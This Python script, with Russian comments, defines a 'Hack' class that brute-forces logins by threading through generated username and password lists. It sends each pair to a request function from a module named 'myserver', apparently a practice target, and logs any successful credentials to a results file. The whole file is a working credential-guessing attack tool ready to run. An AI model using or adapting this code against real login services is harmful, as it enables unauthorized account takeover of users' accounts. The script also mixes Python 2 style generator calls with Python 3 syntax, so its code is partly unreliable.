import threading

from generators import simple_login_generator, simple_password_generator, popular_password_generator, \
    brute_force_generator
from requesters import myserver


class Hack:

    def __init__(self, login_generator, password_generator, request,
                 limit_passwords_per_login=100, result_filename='result.txt'):
        """
        Создать хакера.

        :param login_generator: функция генерирующая логины
        :param password_generator: функция генерирующая пароли
        :param request: функция делающая запрос
        :param limit_passwords_per_login: запросов на 1 логин
        :param result_filename: куда писать результаты
        """
        self.login_generator = login_generator
        self.password_generator = password_generator
        self.request = request
        self.limit_passwords_per_login = limit_passwords_per_login
        self.result_filename = result_filename

    def attack(self):
        login_generator = self.login_generator()
        login = login_generator.next()
        threads = []
        while login is not None:
            thread = threading.Thread(target=self.attack_login, args=[login])
            thread.start()
            threads.append(thread)
            login = login_generator.next()

        for thread in threads:
            thread.join()

    def attack_login(self, login):
        password_generator = self.password_generator()
        for i in range(self.limit_passwords_per_login):
            password = password_generator.next()
            if password is None:
                break
            print(f'Trying {login=} {password=} ...')
            success = self.request(login, password)
            if success:
                print(f'SUCCESS! {login=} {password=}')
                with open(self.result_filename, 'a') as result_file:
                    result_file.write(f'{login=} {password=}\n')
                break


hack = Hack(login_generator=simple_login_generator.Generator,
            password_generator=brute_force_generator.Generator,
            request=myserver.request,
            limit_passwords_per_login=1000)
hack.attack()
